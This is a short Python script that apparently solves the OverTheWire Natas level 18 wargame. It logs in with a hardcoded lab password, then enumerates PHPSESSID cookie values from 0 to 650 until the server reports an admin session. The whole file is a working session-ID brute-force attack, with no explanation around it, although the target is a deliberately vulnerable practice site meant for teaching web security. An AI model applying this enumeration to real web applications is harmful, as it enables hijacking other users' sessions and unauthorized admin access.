#!/usr/bin/env python3

import requests
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas18.natas.labs.overthewire.org/index.php"
CREDS = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

POST_DATA = {"username" : "admin", "password" : "admin"}
COOKIE = {"PHPSESSID": "0"}

def output(id, end):
    print(f"PHPSESSID: {id}", end=end)


s = requests.session()
s.auth = CREDS

for id in range(0,651):
    output(id, "\r")

    COOKIE["PHPSESSID"] = str(id)
    
    resp = s.get(ADDR, cookies=COOKIE)

    if "You are an admin." in resp.text:
        output(id, "\n")
        break




